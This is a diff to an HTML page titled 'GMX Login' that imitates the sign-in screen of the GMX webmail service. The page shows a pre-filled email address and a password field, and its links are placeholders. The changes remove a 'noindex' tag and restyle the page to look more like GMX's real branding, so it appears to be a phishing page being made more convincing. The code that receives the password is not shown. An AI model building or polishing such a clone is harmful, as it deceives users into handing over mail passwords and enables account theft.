@@ -3,39 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="robots" content="noindex">
     <title>GMX Login</title>
     <link rel="icon" href="https://www.gmx.net/favicon.ico">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         body{font-family:Roboto,sans-serif;background:#ebebeb;min-height:100vh;display:flex;flex-direction:column}
-        .header{background:#fff;padding:0 24px;height:64px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #ddd}
-        .header-logo{display:flex;align-items:center;gap:8px}
-        .header-logo svg{height:28px;width:auto}
-        .header-links{display:flex;gap:24px;align-items:center}
-        .header-links a{font-size:14px;color:#d42e12;text-decoration:none;font-weight:500}
-        .header-links a:hover{text-decoration:underline}
+        .header{background:#fff;height:64px;display:flex;align-items:center;justify-content:space-between;padding:0 24px;border-bottom:1px solid #ddd}
+        .header-logo{display:flex;align-items:center}
+        .header-logo svg{height:24px}
+        .header-right{display:flex;gap:20px;align-items:center}
+        .header-right a{font-size:14px;color:#1c449b;text-decoration:none;font-weight:500}
+        .header-right a:hover{text-decoration:underline}
         .main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px}
-        .login-box{background:#fff;padding:32px 40px;width:100%;max-width:400px;box-shadow:0 2px 8px rgba(0,0,0,.08)}
-        .logo-center{text-align:center;margin-bottom:24px}
-        .logo-center svg{height:40px;width:auto}
-        h2{font-size:18px;color:#333;text-align:center;margin-bottom:4px;font-weight:500}
-        .sub{text-align:center;font-size:13px;color:#888;margin-bottom:24px}
-        .email-display{display:flex;align-items:center;padding:12px 16px;background:#f5f5f5;margin-bottom:20px;gap:12px}
+        .login-box{background:#fff;padding:32px;width:100%;max-width:400px;border-radius:16px;box-shadow:1px -1px 27px -1px #b8b8b8;text-align:center}
+        .logo-center{margin-bottom:24px}
+        .logo-center svg{height:32px}
+        h2{font-size:18px;color:#333;font-weight:500;margin-bottom:4px}
+        .sub{font-size:13px;color:#888;margin-bottom:24px}
+        .email-display{display:flex;align-items:center;padding:12px 16px;background:#f5f5f5;margin-bottom:20px;gap:12px;text-align:left}
         .avatar{width:32px;height:32px;border-radius:50%;background:#d42e12;display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px;font-weight:500;flex-shrink:0}
-        .email-text{font-size:14px;color:#333;font-weight:400}
-        .form-group{margin-bottom:16px}
+        .email-text{font-size:14px;color:#333}
+        .form-group{text-align:left;margin-bottom:16px}
         .form-group label{display:block;font-size:13px;color:#333;margin-bottom:6px;font-weight:500}
-        .form-group input{width:100%;height:40px;padding:0 12px;font-size:14px;font-family:Roboto,sans-serif;border:1px solid #ccc;outline:none;transition:border-color .2s}
+        .form-group input{width:100%;height:40px;padding:0 12px;font-size:14px;font-family:Roboto,sans-serif;border:1px solid #ccc;border-radius:4px;outline:none;transition:border-color .2s}
         .form-group input:focus{border-color:#d42e12}
         .checkbox-row{display:flex;align-items:center;gap:8px;margin-bottom:16px}
         .checkbox-row input[type="checkbox"]{width:16px;height:16px;cursor:pointer}
         .checkbox-row label{font-size:13px;color:#666;cursor:pointer}
-        .btn-login{width:100%;height:44px;background:#d42e12;color:#fff;border:none;font-size:15px;font-weight:600;cursor:pointer;transition:background .15s}
-        .btn-login:hover{background:#b92410}
+        .btn-login{width:100%;height:40px;background:#1c449b;color:#fff;border:none;border-radius:1000px;font-size:16px;font-weight:500;font-family:Roboto,sans-serif;cursor:pointer;transition:background .15s}
+        .btn-login:hover{background:#15357a}
         .links-row{display:flex;justify-content:space-between;margin-top:16px}
-        .links-row a{font-size:13px;color:#d42e12;text-decoration:none}
+        .links-row a{font-size:13px;color:#1c449b;text-decoration:none}
         .links-row a:hover{text-decoration:underline}
         .footer{background:#333;color:#fff;padding:16px 24px;text-align:center;font-size:11px;margin-top:auto}
         .footer a{color:#ccc;text-decoration:none;margin:0 8px}
@@ -50,7 +49,7 @@
                 <text x="0" y="24" font-family="Roboto,sans-serif" font-size="26" font-weight="700" fill="#d42e12">GMX</text>
             </svg>
         </div>
-        <div class="header-links">
+        <div class="header-right">
             <a href="#">Hilfe</a>
             <a href="#">E-Mail</a>
         </div>
@@ -98,7 +97,6 @@
         <a href="#">Impressum</a>
         <a href="#">Datenschutz</a>
         <a href="#">AGB</a>
-        <a href="#">Hilfe</a>
     </div>
 </body>
 </html>
